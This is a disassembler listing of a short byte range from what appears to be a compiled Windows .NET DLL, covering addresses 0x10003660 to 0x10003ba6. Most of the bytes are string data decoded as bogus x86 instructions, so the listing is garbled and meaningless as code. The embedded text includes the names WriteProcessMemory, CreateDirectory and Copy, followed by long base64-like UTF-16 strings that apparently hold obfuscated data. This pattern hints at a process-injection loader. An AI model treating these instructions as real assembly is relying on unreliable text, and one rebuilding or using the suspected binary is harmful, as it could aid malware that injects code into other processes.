10003660:	6b 66 6a 66          	imul   $0x66,0x6a(%esi),%esp
10003664:	50                   	push   %eax
10003665:	4b                   	dec    %ebx
10003666:	61                   	popa
10003667:	51                   	push   %ecx
10003668:	55                   	push   %ebp
10003669:	45                   	inc    %ebp
1000366a:	6c                   	insb   (%dx),%es:(%edi)
1000366b:	63 4d 79             	arpl   %ecx,0x79(%ebp)
1000366e:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
10003672:	72 72                	jb     0x100036e6
10003674:	61                   	popa
10003675:	79 00                	jns    0x10003677
10003677:	43                   	inc    %ebx
10003678:	6f                   	outsl  %ds:(%esi),(%dx)
10003679:	70 79                	jo     0x100036f4
1000367b:	00 57 72             	add    %dl,0x72(%edi)
1000367e:	69 74 65 50 72 6f 63 	imul   $0x65636f72,0x50(%ebp,%eiz,2),%esi
10003685:	65 
10003686:	73 73                	jae    0x100036fb
10003688:	4d                   	dec    %ebp
10003689:	65 6d                	gs insl (%dx),%es:(%edi)
1000368b:	6f                   	outsl  %ds:(%esi),(%dx)
1000368c:	72 79                	jb     0x10003707
1000368e:	00 43 72             	add    %al,0x72(%ebx)
10003691:	65 61                	gs popa
10003693:	74 65                	je     0x100036fa
10003695:	44                   	inc    %esp
10003696:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
1000369d:	79 00                	jns    0x1000369f
1000369f:	6f                   	outsl  %ds:(%esi),(%dx)
100036a0:	70 5f                	jo     0x10003701
100036a2:	45                   	inc    %ebp
100036a3:	71 75                	jno    0x1000371a
100036a5:	61                   	popa
100036a6:	6c                   	insb   (%dx),%es:(%edi)
100036a7:	69 74 79 00 49 66 63 	imul   $0x62636649,0x0(%ecx,%edi,2),%esi
100036ae:	62 
100036af:	7a 58                	jp     0x10003709
100036b1:	6c                   	insb   (%dx),%es:(%edi)
100036b2:	31 4a 35             	xor    %ecx,0x35(%edx)
100036b5:	7a 54                	jp     0x1000370b
100036b7:	30 65 44             	xor    %ah,0x44(%ebp)
100036ba:	77 68                	ja     0x10003724
100036bc:	6f                   	outsl  %ds:(%esi),(%dx)
100036bd:	68 31 7a 00 00       	push   $0x7a31
100036c2:	00 00                	add    %al,(%eax)
100036c4:	00 82 e1 4d 00 6a    	add    %al,0x6a004de1(%edx)
100036ca:	00 4e 00             	add    %cl,0x0(%esi)
100036cd:	78 00                	js     0x100036cf
100036cf:	5a                   	pop    %edx
100036d0:	00 57 00             	add    %dl,0x0(%edi)
100036d3:	74 00                	je     0x100036d5
100036d5:	42                   	inc    %edx
100036d6:	00 63 00             	add    %ah,0x0(%ebx)
100036d9:	47                   	inc    %edi
100036da:	00 39                	add    %bh,(%ecx)
100036dc:	00 45 00             	add    %al,0x0(%ebp)
100036df:	59                   	pop    %ecx
100036e0:	00 56 00             	add    %dl,0x0(%esi)
100036e3:	6c                   	insb   (%dx),%es:(%edi)
100036e4:	00 58 00             	add    %bl,0x0(%eax)
100036e7:	53                   	push   %ebx
100036e8:	00 6a 00             	add    %ch,0x0(%edx)
100036eb:	49                   	dec    %ecx
100036ec:	00 7a 00             	add    %bh,0x0(%edx)
100036ef:	63 00                	arpl   %eax,(%eax)
100036f1:	57                   	push   %edi
100036f2:	00 56 00             	add    %dl,0x0(%esi)
100036f5:	72 00                	jb     0x100036f7
100036f7:	51                   	push   %ecx
100036f8:	00 58 00             	add    %bl,0x0(%eax)
100036fb:	42                   	inc    %edx
100036fc:	00 76 00             	add    %dh,0x0(%esi)
100036ff:	52                   	push   %edx
10003700:	00 47 00             	add    %al,0x0(%edi)
10003703:	45                   	inc    %ebp
10003704:	00 79 00             	add    %bh,0x0(%ecx)
10003707:	4d                   	dec    %ebp
10003708:	00 33                	add    %dh,(%ebx)
1000370a:	00 46 00             	add    %al,0x0(%esi)
1000370d:	6c                   	insb   (%dx),%es:(%edi)
1000370e:	00 61 00             	add    %ah,0x0(%ecx)
10003711:	30 00                	xor    %al,(%eax)
10003713:	46                   	inc    %esi
10003714:	00 77 00             	add    %dh,0x0(%edi)
10003717:	62 00                	bound  %eax,(%eax)
10003719:	30 00                	xor    %al,(%eax)
1000371b:	52                   	push   %edx
1000371c:	00 68 00             	add    %ch,0x0(%eax)
1000371f:	61                   	popa
10003720:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
10003724:	00 48 00             	add    %cl,0x0(%eax)
10003727:	4d                   	dec    %ebp
10003728:	00 6a 00             	add    %ch,0x0(%edx)
1000372b:	4e                   	dec    %esi
1000372c:	00 78 00             	add    %bh,0x0(%eax)
1000372f:	5a                   	pop    %edx
10003730:	00 57 00             	add    %dl,0x0(%edi)
10003733:	74 00                	je     0x10003735
10003735:	42                   	inc    %edx
10003736:	00 63 00             	add    %ah,0x0(%ebx)
10003739:	47                   	inc    %edi
1000373a:	00 39                	add    %bh,(%ecx)
1000373c:	00 45 00             	add    %al,0x0(%ebp)
1000373f:	59                   	pop    %ecx
10003740:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
10003744:	00 7a 00             	add    %bh,0x0(%edx)
10003747:	63 00                	arpl   %eax,(%eax)
10003749:	57                   	push   %edi
1000374a:	00 56 00             	add    %dl,0x0(%esi)
1000374d:	72 00                	jb     0x1000374f
1000374f:	51                   	push   %ecx
10003750:	00 58 00             	add    %bl,0x0(%eax)
10003753:	42                   	inc    %edx
10003754:	00 76 00             	add    %dh,0x0(%esi)
10003757:	52                   	push   %edx
10003758:	00 47 00             	add    %al,0x0(%edi)
1000375b:	46                   	inc    %esi
1000375c:	00 57 00             	add    %dl,0x0(%edi)
1000375f:	62 00                	bound  %eax,(%eax)
10003761:	56                   	push   %esi
10003762:	00 6f 00             	add    %ch,0x0(%edi)
10003765:	79 00                	jns    0x10003767
10003767:	4d                   	dec    %ebp
10003768:	00 33                	add    %dh,(%ebx)
1000376a:	00 46 00             	add    %al,0x0(%esi)
1000376d:	6c                   	insb   (%dx),%es:(%edi)
1000376e:	00 61 00             	add    %ah,0x0(%ecx)
10003771:	30 00                	xor    %al,(%eax)
10003773:	46                   	inc    %esi
10003774:	00 77 00             	add    %dh,0x0(%edi)
10003777:	62 00                	bound  %eax,(%eax)
10003779:	30 00                	xor    %al,(%eax)
1000377b:	52                   	push   %edx
1000377c:	00 68 00             	add    %ch,0x0(%eax)
1000377f:	4d                   	dec    %ebp
10003780:	00 6a 00             	add    %ch,0x0(%edx)
10003783:	4e                   	dec    %esi
10003784:	00 78 00             	add    %bh,0x0(%eax)
10003787:	5a                   	pop    %edx
10003788:	00 57 00             	add    %dl,0x0(%edi)
1000378b:	74 00                	je     0x1000378d
1000378d:	42                   	inc    %edx
1000378e:	00 63 00             	add    %ah,0x0(%ebx)
10003791:	47                   	inc    %edi
10003792:	00 39                	add    %bh,(%ecx)
10003794:	00 45 00             	add    %al,0x0(%ebp)
10003797:	59                   	pop    %ecx
10003798:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
1000379c:	00 6f 00             	add    %ch,0x0(%edi)
1000379f:	63 00                	arpl   %eax,(%eax)
100037a1:	44                   	inc    %esp
100037a2:	00 49 00             	add    %cl,0x0(%ecx)
100037a5:	7a 00                	jp     0x100037a7
100037a7:	63 00                	arpl   %eax,(%eax)
100037a9:	57                   	push   %edi
100037aa:	00 56 00             	add    %dl,0x0(%esi)
100037ad:	72 00                	jb     0x100037af
100037af:	51                   	push   %ecx
100037b0:	00 58 00             	add    %bl,0x0(%eax)
100037b3:	42                   	inc    %edx
100037b4:	00 76 00             	add    %dh,0x0(%esi)
100037b7:	52                   	push   %edx
100037b8:	00 47 00             	add    %al,0x0(%edi)
100037bb:	45                   	inc    %ebp
100037bc:	00 79 00             	add    %bh,0x0(%ecx)
100037bf:	4d                   	dec    %ebp
100037c0:	00 33                	add    %dh,(%ebx)
100037c2:	00 46 00             	add    %al,0x0(%esi)
100037c5:	6c                   	insb   (%dx),%es:(%edi)
100037c6:	00 61 00             	add    %ah,0x0(%ecx)
100037c9:	30 00                	xor    %al,(%eax)
100037cb:	46                   	inc    %esi
100037cc:	00 77 00             	add    %dh,0x0(%edi)
100037cf:	62 00                	bound  %eax,(%eax)
100037d1:	30 00                	xor    %al,(%eax)
100037d3:	52                   	push   %edx
100037d4:	00 68 00             	add    %ch,0x0(%eax)
100037d7:	59                   	pop    %ecx
100037d8:	00 57 00             	add    %dl,0x0(%edi)
100037db:	31 00                	xor    %eax,(%eax)
100037dd:	30 00                	xor    %al,(%eax)
100037df:	4d                   	dec    %ebp
100037e0:	00 6a 00             	add    %ch,0x0(%edx)
100037e3:	4e                   	dec    %esi
100037e4:	00 78 00             	add    %bh,0x0(%eax)
100037e7:	5a                   	pop    %edx
100037e8:	00 57 00             	add    %dl,0x0(%edi)
100037eb:	74 00                	je     0x100037ed
100037ed:	42                   	inc    %edx
100037ee:	00 63 00             	add    %ah,0x0(%ebx)
100037f1:	47                   	inc    %edi
100037f2:	00 39                	add    %bh,(%ecx)
100037f4:	00 45 00             	add    %al,0x0(%ebp)
100037f7:	59                   	pop    %ecx
100037f8:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
100037fc:	00 7a 00             	add    %bh,0x0(%edx)
100037ff:	63 00                	arpl   %eax,(%eax)
10003801:	57                   	push   %edi
10003802:	00 56 00             	add    %dl,0x0(%esi)
10003805:	72 00                	jb     0x10003807
10003807:	51                   	push   %ecx
10003808:	00 58 00             	add    %bl,0x0(%eax)
1000380b:	42                   	inc    %edx
1000380c:	00 76 00             	add    %dh,0x0(%esi)
1000380f:	52                   	push   %edx
10003810:	00 47 00             	add    %al,0x0(%edi)
10003813:	46                   	inc    %esi
10003814:	00 7a 00             	add    %bh,0x0(%edx)
10003817:	59                   	pop    %ecx
10003818:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
1000381c:	00 79 00             	add    %bh,0x0(%ecx)
1000381f:	4d                   	dec    %ebp
10003820:	00 33                	add    %dh,(%ebx)
10003822:	00 46 00             	add    %al,0x0(%esi)
10003825:	6c                   	insb   (%dx),%es:(%edi)
10003826:	00 61 00             	add    %ah,0x0(%ecx)
10003829:	30 00                	xor    %al,(%eax)
1000382b:	46                   	inc    %esi
1000382c:	00 77 00             	add    %dh,0x0(%edi)
1000382f:	62 00                	bound  %eax,(%eax)
10003831:	30 00                	xor    %al,(%eax)
10003833:	52                   	push   %edx
10003834:	00 68 00             	add    %ch,0x0(%eax)
10003837:	4d                   	dec    %ebp
10003838:	00 6a 00             	add    %ch,0x0(%edx)
1000383b:	4e                   	dec    %esi
1000383c:	00 78 00             	add    %bh,0x0(%eax)
1000383f:	5a                   	pop    %edx
10003840:	00 57 00             	add    %dl,0x0(%edi)
10003843:	74 00                	je     0x10003845
10003845:	42                   	inc    %edx
10003846:	00 63 00             	add    %ah,0x0(%ebx)
10003849:	47                   	inc    %edi
1000384a:	00 39                	add    %bh,(%ecx)
1000384c:	00 45 00             	add    %al,0x0(%ebp)
1000384f:	59                   	pop    %ecx
10003850:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
10003854:	00 32                	add    %dh,(%edx)
10003856:	00 59 00             	add    %bl,0x0(%ecx)
10003859:	7a 00                	jp     0x1000385b
1000385b:	49                   	dec    %ecx
1000385c:	00 7a 00             	add    %bh,0x0(%edx)
1000385f:	63 00                	arpl   %eax,(%eax)
10003861:	57                   	push   %edi
10003862:	00 56 00             	add    %dl,0x0(%esi)
10003865:	72 00                	jb     0x10003867
10003867:	51                   	push   %ecx
10003868:	00 58 00             	add    %bl,0x0(%eax)
1000386b:	42                   	inc    %edx
1000386c:	00 76 00             	add    %dh,0x0(%esi)
1000386f:	52                   	push   %edx
10003870:	00 47 00             	add    %al,0x0(%edi)
10003873:	45                   	inc    %ebp
10003874:	00 79 00             	add    %bh,0x0(%ecx)
10003877:	4d                   	dec    %ebp
10003878:	00 33                	add    %dh,(%ebx)
1000387a:	00 46 00             	add    %al,0x0(%esi)
1000387d:	6c                   	insb   (%dx),%es:(%edi)
1000387e:	00 61 00             	add    %ah,0x0(%ecx)
10003881:	30 00                	xor    %al,(%eax)
10003883:	46                   	inc    %esi
10003884:	00 77 00             	add    %dh,0x0(%edi)
10003887:	62 00                	bound  %eax,(%eax)
10003889:	30 00                	xor    %al,(%eax)
1000388b:	52                   	push   %edx
1000388c:	00 68 00             	add    %ch,0x0(%eax)
1000388f:	53                   	push   %ebx
10003890:	00 45 00             	add    %al,0x0(%ebp)
10003893:	5a                   	pop    %edx
10003894:	00 35 00 4d 00 6a    	add    %dh,0x6a004d00
1000389a:	00 4e 00             	add    %cl,0x0(%esi)
1000389d:	78 00                	js     0x1000389f
1000389f:	5a                   	pop    %edx
100038a0:	00 57 00             	add    %dl,0x0(%edi)
100038a3:	74 00                	je     0x100038a5
100038a5:	42                   	inc    %edx
100038a6:	00 63 00             	add    %ah,0x0(%ebx)
100038a9:	47                   	inc    %edi
100038aa:	00 39                	add    %bh,(%ecx)
100038ac:	00 45 00             	add    %al,0x0(%ebp)
100038af:	59                   	pop    %ecx
100038b0:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
100038b4:	00 7a 00             	add    %bh,0x0(%edx)
100038b7:	63 00                	arpl   %eax,(%eax)
100038b9:	57                   	push   %edi
100038ba:	00 56 00             	add    %dl,0x0(%esi)
100038bd:	72 00                	jb     0x100038bf
100038bf:	51                   	push   %ecx
100038c0:	00 58 00             	add    %bl,0x0(%eax)
100038c3:	42                   	inc    %edx
100038c4:	00 76 00             	add    %dh,0x0(%esi)
100038c7:	52                   	push   %edx
100038c8:	00 47 00             	add    %al,0x0(%edi)
100038cb:	46                   	inc    %esi
100038cc:	00 6a 00             	add    %ch,0x0(%edx)
100038cf:	4d                   	dec    %ebp
100038d0:	00 31                	add    %dh,(%ecx)
100038d2:	00 49 00             	add    %cl,0x0(%ecx)
100038d5:	79 00                	jns    0x100038d7
100038d7:	4d                   	dec    %ebp
100038d8:	00 33                	add    %dh,(%ebx)
100038da:	00 46 00             	add    %al,0x0(%esi)
100038dd:	6c                   	insb   (%dx),%es:(%edi)
100038de:	00 61 00             	add    %ah,0x0(%ecx)
100038e1:	30 00                	xor    %al,(%eax)
100038e3:	46                   	inc    %esi
100038e4:	00 77 00             	add    %dh,0x0(%edi)
100038e7:	62 00                	bound  %eax,(%eax)
100038e9:	30 00                	xor    %al,(%eax)
100038eb:	52                   	push   %edx
100038ec:	00 68 00             	add    %ch,0x0(%eax)
100038ef:	4d                   	dec    %ebp
100038f0:	00 6a 00             	add    %ch,0x0(%edx)
100038f3:	4e                   	dec    %esi
100038f4:	00 78 00             	add    %bh,0x0(%eax)
100038f7:	5a                   	pop    %edx
100038f8:	00 57 00             	add    %dl,0x0(%edi)
100038fb:	74 00                	je     0x100038fd
100038fd:	42                   	inc    %edx
100038fe:	00 63 00             	add    %ah,0x0(%ebx)
10003901:	47                   	inc    %edi
10003902:	00 39                	add    %bh,(%ecx)
10003904:	00 45 00             	add    %al,0x0(%ebp)
10003907:	59                   	pop    %ecx
10003908:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
1000390c:	00 6b 00             	add    %ch,0x0(%ebx)
1000390f:	62 00                	bound  %eax,(%eax)
10003911:	6a 00                	push   $0x0
10003913:	49                   	dec    %ecx
10003914:	00 7a 00             	add    %bh,0x0(%edx)
10003917:	63 00                	arpl   %eax,(%eax)
10003919:	57                   	push   %edi
1000391a:	00 56 00             	add    %dl,0x0(%esi)
1000391d:	72 00                	jb     0x1000391f
1000391f:	51                   	push   %ecx
10003920:	00 58 00             	add    %bl,0x0(%eax)
10003923:	42                   	inc    %edx
10003924:	00 76 00             	add    %dh,0x0(%esi)
10003927:	52                   	push   %edx
10003928:	00 47 00             	add    %al,0x0(%edi)
1000392b:	45                   	inc    %ebp
1000392c:	00 79 00             	add    %bh,0x0(%ecx)
1000392f:	4d                   	dec    %ebp
10003930:	00 33                	add    %dh,(%ebx)
10003932:	00 46 00             	add    %al,0x0(%esi)
10003935:	6c                   	insb   (%dx),%es:(%edi)
10003936:	00 61 00             	add    %ah,0x0(%ecx)
10003939:	30 00                	xor    %al,(%eax)
1000393b:	46                   	inc    %esi
1000393c:	00 77 00             	add    %dh,0x0(%edi)
1000393f:	62 00                	bound  %eax,(%eax)
10003941:	30 00                	xor    %al,(%eax)
10003943:	52                   	push   %edx
10003944:	00 68 00             	add    %ch,0x0(%eax)
10003947:	5a                   	pop    %edx
10003948:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
1000394c:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
10003950:	00 6a 00             	add    %ch,0x0(%edx)
10003953:	4e                   	dec    %esi
10003954:	00 78 00             	add    %bh,0x0(%eax)
10003957:	5a                   	pop    %edx
10003958:	00 57 00             	add    %dl,0x0(%edi)
1000395b:	74 00                	je     0x1000395d
1000395d:	42                   	inc    %edx
1000395e:	00 63 00             	add    %ah,0x0(%ebx)
10003961:	47                   	inc    %edi
10003962:	00 39                	add    %bh,(%ecx)
10003964:	00 45 00             	add    %al,0x0(%ebp)
10003967:	59                   	pop    %ecx
10003968:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
1000396c:	00 7a 00             	add    %bh,0x0(%edx)
1000396f:	63 00                	arpl   %eax,(%eax)
10003971:	57                   	push   %edi
10003972:	00 56 00             	add    %dl,0x0(%esi)
10003975:	72 00                	jb     0x10003977
10003977:	51                   	push   %ecx
10003978:	00 58 00             	add    %bl,0x0(%eax)
1000397b:	42                   	inc    %edx
1000397c:	00 76 00             	add    %dh,0x0(%esi)
1000397f:	52                   	push   %edx
10003980:	00 47 00             	add    %al,0x0(%edi)
10003983:	46                   	inc    %esi
10003984:	00 59 00             	add    %bl,0x0(%ecx)
10003987:	62 00                	bound  %eax,(%eax)
10003989:	7a 00                	jp     0x1000398b
1000398b:	30 00                	xor    %al,(%eax)
1000398d:	79 00                	jns    0x1000398f
1000398f:	4d                   	dec    %ebp
10003990:	00 33                	add    %dh,(%ebx)
10003992:	00 46 00             	add    %al,0x0(%esi)
10003995:	6c                   	insb   (%dx),%es:(%edi)
10003996:	00 61 00             	add    %ah,0x0(%ecx)
10003999:	30 00                	xor    %al,(%eax)
1000399b:	46                   	inc    %esi
1000399c:	00 77 00             	add    %dh,0x0(%edi)
1000399f:	62 00                	bound  %eax,(%eax)
100039a1:	30 00                	xor    %al,(%eax)
100039a3:	52                   	push   %edx
100039a4:	00 68 00             	add    %ch,0x0(%eax)
100039a7:	00 15 32 00 33 00    	add    %dl,0x330032
100039ad:	71 00                	jno    0x100039af
100039af:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
100039b3:	41                   	inc    %ecx
100039b4:	00 70 00             	add    %dh,0x0(%eax)
100039b7:	6f                   	outsl  %ds:(%esi),(%dx)
100039b8:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
100039bc:	00 00                	add    %al,(%eax)
100039be:	01 00                	add    %eax,(%eax)
100039c0:	81 71 51 00 58 00 4a 	xorl   $0x4a005800,0x51(%ecx)
100039c7:	00 78 00             	add    %bh,0x0(%eax)
100039ca:	63 00                	arpl   %eax,(%eax)
100039cc:	6e                   	outsb  %ds:(%esi),(%dx)
100039cd:	00 41 00             	add    %al,0x0(%ecx)
100039d0:	30 00                	xor    %al,(%eax)
100039d2:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
100039d6:	39 00                	cmp    %eax,(%eax)
100039d8:	42                   	inc    %edx
100039d9:	00 53 00             	add    %dl,0x0(%ebx)
100039dc:	54                   	push   %esp
100039dd:	00 42 00             	add    %al,0x0(%edx)
100039e0:	4d                   	dec    %ebp
100039e1:	00 4d 00             	add    %cl,0x0(%ebp)
100039e4:	30 00                	xor    %al,(%eax)
100039e6:	46                   	inc    %esi
100039e7:	00 79 00             	add    %bh,0x0(%ecx)
100039ea:	63 00                	arpl   %eax,(%eax)
100039ec:	58                   	pop    %eax
100039ed:	00 4a 00             	add    %cl,0x0(%edx)
100039f0:	77 00                	ja     0x100039f2
100039f2:	4e                   	dec    %esi
100039f3:	00 48 00             	add    %cl,0x0(%eax)
100039f6:	5a                   	pop    %edx
100039f7:	00 50 00             	add    %dl,0x0(%eax)
100039fa:	51                   	push   %ecx
100039fb:	00 55 00             	add    %dl,0x0(%ebp)
100039fe:	6c                   	insb   (%dx),%es:(%edi)
100039ff:	00 42 00             	add    %al,0x0(%edx)
10003a02:	63 00                	arpl   %eax,(%eax)
10003a04:	6e                   	outsb  %ds:(%esi),(%dx)
10003a05:	00 46 00             	add    %al,0x0(%esi)
10003a08:	79 00                	jns    0x10003a0a
10003a0a:	63 00                	arpl   %eax,(%eax)
10003a0c:	44                   	inc    %esp
10003a0d:	00 52 00             	add    %dl,0x0(%edx)
10003a10:	32 00                	xor    (%eax),%al
10003a12:	54                   	push   %esp
10003a13:	00 30                	add    %dh,(%eax)
10003a15:	00 46 00             	add    %al,0x0(%esi)
10003a18:	4a                   	dec    %edx
10003a19:	00 55 00             	add    %dl,0x0(%ebp)
10003a1c:	58                   	pop    %eax
10003a1d:	00 5a 00             	add    %bl,0x0(%edx)
10003a20:	30 00                	xor    %al,(%eax)
10003a22:	51                   	push   %ecx
10003a23:	00 58 00             	add    %bl,0x0(%eax)
10003a26:	4a                   	dec    %edx
10003a27:	00 78 00             	add    %bh,0x0(%eax)
10003a2a:	63 00                	arpl   %eax,(%eax)
10003a2c:	6e                   	outsb  %ds:(%esi),(%dx)
10003a2d:	00 41 00             	add    %al,0x0(%ecx)
10003a30:	30 00                	xor    %al,(%eax)
10003a32:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
10003a36:	39 00                	cmp    %eax,(%eax)
10003a38:	42                   	inc    %edx
10003a39:	00 53 00             	add    %dl,0x0(%ebx)
10003a3c:	55                   	push   %ebp
10003a3d:	00 46 00             	add    %al,0x0(%esi)
10003a40:	79 00                	jns    0x10003a42
10003a42:	63 00                	arpl   %eax,(%eax)
10003a44:	58                   	pop    %eax
10003a45:	00 4a 00             	add    %cl,0x0(%edx)
10003a48:	77 00                	ja     0x10003a4a
10003a4a:	4e                   	dec    %esi
10003a4b:	00 48 00             	add    %cl,0x0(%eax)
10003a4e:	5a                   	pop    %edx
10003a4f:	00 50 00             	add    %dl,0x0(%eax)
10003a52:	51                   	push   %ecx
10003a53:	00 55 00             	add    %dl,0x0(%ebp)
10003a56:	6c                   	insb   (%dx),%es:(%edi)
10003a57:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
10003a5b:	00 7a 00             	add    %bh,0x0(%edx)
10003a5e:	42                   	inc    %edx
10003a5f:	00 42 00             	add    %al,0x0(%edx)
10003a62:	63 00                	arpl   %eax,(%eax)
10003a64:	6e                   	outsb  %ds:(%esi),(%dx)
10003a65:	00 46 00             	add    %al,0x0(%esi)
10003a68:	79 00                	jns    0x10003a6a
10003a6a:	63 00                	arpl   %eax,(%eax)
10003a6c:	44                   	inc    %esp
10003a6d:	00 52 00             	add    %dl,0x0(%edx)
10003a70:	32 00                	xor    (%eax),%al
10003a72:	54                   	push   %esp
10003a73:	00 30                	add    %dh,(%eax)
10003a75:	00 46 00             	add    %al,0x0(%esi)
10003a78:	4a                   	dec    %edx
10003a79:	00 51 00             	add    %dl,0x0(%ecx)
10003a7c:	58                   	pop    %eax
10003a7d:	00 4a 00             	add    %cl,0x0(%edx)
10003a80:	78 00                	js     0x10003a82
10003a82:	63 00                	arpl   %eax,(%eax)
10003a84:	6e                   	outsb  %ds:(%esi),(%dx)
10003a85:	00 41 00             	add    %al,0x0(%ecx)
10003a88:	30 00                	xor    %al,(%eax)
10003a8a:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
10003a8e:	39 00                	cmp    %eax,(%eax)
10003a90:	42                   	inc    %edx
10003a91:	00 53 00             	add    %dl,0x0(%ebx)
10003a94:	56                   	push   %esi
10003a95:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
10003a99:	00 55 00             	add    %dl,0x0(%ebp)
10003a9c:	6b 00 46             	imul   $0x46,(%eax),%eax
10003a9f:	00 79 00             	add    %bh,0x0(%ecx)
10003aa2:	63 00                	arpl   %eax,(%eax)
10003aa4:	58                   	pop    %eax
10003aa5:	00 4a 00             	add    %cl,0x0(%edx)
10003aa8:	77 00                	ja     0x10003aaa
10003aaa:	4e                   	dec    %esi
10003aab:	00 48 00             	add    %cl,0x0(%eax)
10003aae:	5a                   	pop    %edx
10003aaf:	00 50 00             	add    %dl,0x0(%eax)
10003ab2:	51                   	push   %ecx
10003ab3:	00 55 00             	add    %dl,0x0(%ebp)
10003ab6:	6c                   	insb   (%dx),%es:(%edi)
10003ab7:	00 42 00             	add    %al,0x0(%edx)
10003aba:	63 00                	arpl   %eax,(%eax)
10003abc:	6e                   	outsb  %ds:(%esi),(%dx)
10003abd:	00 46 00             	add    %al,0x0(%esi)
10003ac0:	79 00                	jns    0x10003ac2
10003ac2:	63 00                	arpl   %eax,(%eax)
10003ac4:	44                   	inc    %esp
10003ac5:	00 52 00             	add    %dl,0x0(%edx)
10003ac8:	32 00                	xor    (%eax),%al
10003aca:	54                   	push   %esp
10003acb:	00 30                	add    %dh,(%eax)
10003acd:	00 46 00             	add    %al,0x0(%esi)
10003ad0:	4a                   	dec    %edx
10003ad1:	00 5a 00             	add    %bl,0x0(%edx)
10003ad4:	31 00                	xor    %eax,(%eax)
10003ad6:	45                   	inc    %ebp
10003ad7:	00 39                	add    %bh,(%ecx)
10003ad9:	00 51 00             	add    %dl,0x0(%ecx)
10003adc:	58                   	pop    %eax
10003add:	00 4a 00             	add    %cl,0x0(%edx)
10003ae0:	78 00                	js     0x10003ae2
10003ae2:	63 00                	arpl   %eax,(%eax)
10003ae4:	6e                   	outsb  %ds:(%esi),(%dx)
10003ae5:	00 41 00             	add    %al,0x0(%ecx)
10003ae8:	30 00                	xor    %al,(%eax)
10003aea:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
10003aee:	39 00                	cmp    %eax,(%eax)
10003af0:	42                   	inc    %edx
10003af1:	00 53 00             	add    %dl,0x0(%ebx)
10003af4:	55                   	push   %ebp
10003af5:	00 46 00             	add    %al,0x0(%esi)
10003af8:	79 00                	jns    0x10003afa
10003afa:	63 00                	arpl   %eax,(%eax)
10003afc:	58                   	pop    %eax
10003afd:	00 4a 00             	add    %cl,0x0(%edx)
10003b00:	77 00                	ja     0x10003b02
10003b02:	4e                   	dec    %esi
10003b03:	00 48 00             	add    %cl,0x0(%eax)
10003b06:	5a                   	pop    %edx
10003b07:	00 50 00             	add    %dl,0x0(%eax)
10003b0a:	51                   	push   %ecx
10003b0b:	00 55 00             	add    %dl,0x0(%ebp)
10003b0e:	6b 00 39             	imul   $0x39,(%eax),%eax
10003b11:	00 51 00             	add    %dl,0x0(%ecx)
10003b14:	58                   	pop    %eax
10003b15:	00 4a 00             	add    %cl,0x0(%edx)
10003b18:	78 00                	js     0x10003b1a
10003b1a:	63 00                	arpl   %eax,(%eax)
10003b1c:	6e                   	outsb  %ds:(%esi),(%dx)
10003b1d:	00 41 00             	add    %al,0x0(%ecx)
10003b20:	30 00                	xor    %al,(%eax)
10003b22:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
10003b26:	39 00                	cmp    %eax,(%eax)
10003b28:	42                   	inc    %edx
10003b29:	00 53 00             	add    %dl,0x0(%ebx)
10003b2c:	51                   	push   %ecx
10003b2d:	00 3d 00 3d 00 00    	add    %bh,0x3d00
10003b33:	15 41 00 72 00       	adc    $0x720041,%eax
10003b38:	71 00                	jno    0x10003b3a
10003b3a:	72 00                	jb     0x10003b3c
10003b3c:	70 00                	jo     0x10003b3e
10003b3e:	34 00                	xor    $0x0,%al
10003b40:	76 00                	jbe    0x10003b42
10003b42:	4f                   	dec    %edi
10003b43:	00 41 00             	add    %al,0x0(%ecx)
10003b46:	49                   	dec    %ecx
10003b47:	00 00                	add    %al,(%eax)
10003b49:	81 b1 4f 00 54 00 64 	xorl   $0x310064,0x54004f(%ecx)
10003b50:	00 31 00 
10003b53:	62 00                	bound  %eax,(%eax)
10003b55:	48                   	dec    %eax
10003b56:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
10003b5a:	00 62 00             	add    %ah,0x0(%edx)
10003b5d:	56                   	push   %esi
10003b5e:	00 4a 00             	add    %cl,0x0(%edx)
10003b61:	61                   	popa
10003b62:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
10003b66:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10003b6a:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
10003b6e:	00 6b 00             	add    %ch,0x0(%ebx)
10003b71:	33 00                	xor    (%eax),%eax
10003b73:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10003b77:	78 00                	js     0x10003b79
10003b79:	33 00                	xor    (%eax),%eax
10003b7b:	57                   	push   %edi
10003b7c:	00 6d 00             	add    %ch,0x0(%ebp)
10003b7f:	31 00                	xor    %eax,(%eax)
10003b81:	53                   	push   %ebx
10003b82:	00 57 00             	add    %dl,0x0(%edi)
10003b85:	6b 00 38             	imul   $0x38,(%eax),%eax
10003b88:	00 35 00 4e 00 33    	add    %dh,0x33004e00
10003b8e:	00 56 00             	add    %dl,0x0(%esi)
10003b91:	73 00                	jae    0x10003b93
10003b93:	64 00 31             	add    %dh,%fs:(%ecx)
10003b96:	00 70 00             	add    %dh,0x0(%eax)
10003b99:	74 00                	je     0x10003b9b
10003b9b:	55                   	push   %ebp
10003b9c:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
10003ba0:	00 50 00             	add    %dl,0x0(%eax)
10003ba3:	64 00 32             	add    %dh,%fs:(%edx)
10003ba6:	00 4a 00             	add    %cl,0x0(%edx)
